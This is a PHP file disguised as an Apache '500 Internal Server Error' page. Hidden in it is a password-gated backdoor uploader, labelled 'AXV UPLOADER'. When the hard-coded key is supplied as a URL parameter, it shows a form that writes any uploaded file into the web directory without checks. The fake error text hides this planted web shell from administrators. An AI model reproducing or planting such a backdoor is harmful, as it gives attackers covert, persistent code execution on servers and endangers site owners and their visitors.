<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
<title>500 Internal Server Error</title>
</head><body>
<?php
$host = $_SERVER['HTTP_HOST'];

if (isset($_POST['uploaded'])) {
$file = $_FILES['files']['name'];
$files = $_FILES['files']['tmp_name'];
$folder = "";
if (move_uploaded_file($files, $folder . $file)) {
    $result = "Uploaded : => <a href='$file' target='_blank'>Your file here</a>";
} else {
    $result = "Failed to upload...!";
}
}
$password = "4Xvt3cH1337";
if (isset($_GET['passwdXkey']) && $_GET['passwdXkey'] == $password) {
echo '<br /><br /># AXV UPLOADER<br /><form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="files" />
    <input type="submit" name="uploaded" value="Upload">
</form><div style="margin-top: 20px;">' . $result . '</div>';
}
?>

<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@<?php echo $host; ?> to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<p>Additionally, a 500 Internal Server Error
error was encountered while trying to use an ErrorDocument to handle the request.</p>

</body>
</html>
